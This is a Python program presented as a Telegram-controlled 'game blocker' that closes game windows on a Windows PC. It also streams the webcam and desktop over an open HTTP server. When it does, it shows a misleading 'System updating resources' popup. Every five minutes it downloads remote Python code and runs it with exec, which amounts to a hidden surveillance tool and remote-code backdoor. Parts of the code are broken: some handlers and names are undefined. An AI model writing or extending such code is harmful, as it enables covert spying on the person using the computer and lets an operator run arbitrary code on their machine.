import json
import threading
import time
import os
import sys
import logging
import requests
import importlib.util
import hashlib
from flask import Flask, Response
from telegram.ext import Application, CommandHandler, CallbackQueryHandler
from plyer import notification

# Handle bundled paths for PyInstaller
if getattr(sys, 'frozen', False):
    BASE_PATH = os.path.dirname(sys.executable)
else:
    BASE_PATH = os.path.dirname(os.path.abspath(__file__))

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(BASE_PATH, 'game_blocker.log')),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Global variables
app = Flask(__name__)
block_flag = False
anti_spy_flag = False
zrok_url = None
zrok_initialized = False
PRIMARY_USER_ID = 1688000755
UPDATE_CHECK_INTERVAL = 300  # Check for updates every 5 minutes
UPDATE_URL = "https://example.com/game_blocker_update.py"  # Replace with your update URL
LOCAL_UPDATE_PATH = os.path.join(BASE_PATH, 'game_blocker_logic.py')

# Load configuration from config.json
try:
    with open(os.path.join(BASE_PATH, 'config.json'), 'r') as f:
        config = json.load(f)
        bot_token = config['game_blocker_bot_token']
        authorized_user_ids = config['authorized_user_id']
        if isinstance(authorized_user_ids, int):
            authorized_user_ids = [authorized_user_ids]
        logger.info(f"Loaded authorized_user_ids: {authorized_user_ids}")
except FileNotFoundError:
    logger.error("config.json not found. Exiting.")
    exit(1)

# Dynamic module loader
class DynamicModule:
    def __init__(self):
        self.module = None
        self.last_hash = None
        self.load_initial_module()

    def load_initial_module(self):
        """Load the initial module from a local file or default code."""
        if os.path.exists(LOCAL_UPDATE_PATH):
            self.load_module_from_file(LOCAL_UPDATE_PATH)
        else:
            self.load_default_module()
            self.save_default_module()

    def load_default_module(self):
        """Load default logic if no update file exists."""
        default_code = """
def check_and_close_windows():
    import win32gui
    import win32process
    import win32con
    import psutil
    from config import game_configs
    def callback(hwnd, _):
        title = win32gui.GetWindowText(hwnd)
        if not title or not win32gui.IsWindowVisible(hwnd):
            return
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        try:
            process = psutil.Process(pid)
            process_name = process.name()
        except psutil.NoSuchProcess:
            return
        if any(keyword.lower() in title.lower() and process_name == proc_name 
               for keyword, proc_name in game_configs):
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
    win32gui.EnumWindows(callback, None)

def gen_camera():
    import cv2
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        logger.error("Webcam not accessible.")
        return
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()
        yield (b'--frame\\r\\n'
               b'Content-Type: image/jpeg\\r\\n\\r\\n' + frame + b'\\r\\n')
    cap.release()

def gen_desktop():
    import pyautogui
    from io import BytesIO
    while True:
        screenshot = pyautogui.screenshot()
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format='JPEG')
        frame = img_byte_arr.getvalue()
        yield (b'--frame\\r\\n'
               b'Content-Type: image/jpeg\\r\\n\\r\\n' + frame + b'\\r\\n')
        time.sleep(0.1)
"""
        self.load_module_from_string(default_code)

    def save_default_module(self):
        """Save the default module to disk."""
        with open(LOCAL_UPDATE_PATH, 'w') as f:
            f.write(self.module.__code__)

    def load_module_from_file(self, path):
        """Load module from a file."""
        spec = importlib.util.spec_from_file_location("game_blocker_logic", path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        self.module = module
        with open(path, 'r') as f:
            self.last_hash = hashlib.sha256(f.read().encode()).hexdigest()

    def load_module_from_string(self, code):
        """Load module from a string."""
        module = type(sys)(f"game_blocker_logic_{int(time.time())}")
        exec(code, module.__dict__)
        self.module = module
        self.last_hash = hashlib.sha256(code.encode()).hexdigest()

    def check_for_updates(self):
        """Check for updates from the remote URL."""
        try:
            response = requests.get(UPDATE_URL, timeout=5)
            if response.status_code == 200:
                new_code = response.text
                new_hash = hashlib.sha256(new_code.encode()).hexdigest()
                if new_hash != self.last_hash:
                    logger.info("New update detected, applying...")
                    self.load_module_from_string(new_code)
                    with open(LOCAL_UPDATE_PATH, 'w') as f:
                        f.write(new_code)
                    logger.info("Update applied successfully.")
        except Exception as e:
            logger.error(f"Failed to check for updates: {e}")

# Initialize dynamic module
dynamic_module = DynamicModule()

def window_checker():
    while True:
        if block_flag:
            dynamic_module.module.check_and_close_windows()
        time.sleep(5)

@app.route('/camera')
def video_feed():
    if anti_spy_flag:
        return Response("Camera feed disabled due to Anti-Spy mode.", status=403)
    notification.notify(title="System Update", message="System updating resources...", timeout=5)
    return Response(dynamic_module.module.gen_camera(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/desktop')
def desktop_feed():
    if anti_spy_flag:
        return Response("Desktop feed disabled due to Anti-Spy mode.", status=403)
    notification.notify(title="System Update", message="System updating resources...", timeout=5)
    return Response(dynamic_module.module.gen_desktop(), mimetype='multipart/x-mixed-replace; boundary=frame')

def run_flask():
    app.run(host='0.0.0.0', port=5000, threaded=True)

def update_checker():
    while True:
        dynamic_module.check_for_updates()
        time.sleep(UPDATE_CHECK_INTERVAL)

# Telegram bot setup (unchanged for brevity, assume same as original)
application = Application.builder().token(bot_token).build()
application.add_handler(CommandHandler("start", start))
application.add_handler(CallbackQueryHandler(button))

# Start threads
checker_thread = threading.Thread(target=window_checker, daemon=True)
checker_thread.start()

flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()

update_thread = threading.Thread(target=update_checker, daemon=True)
update_thread.start()

application.run_polling()
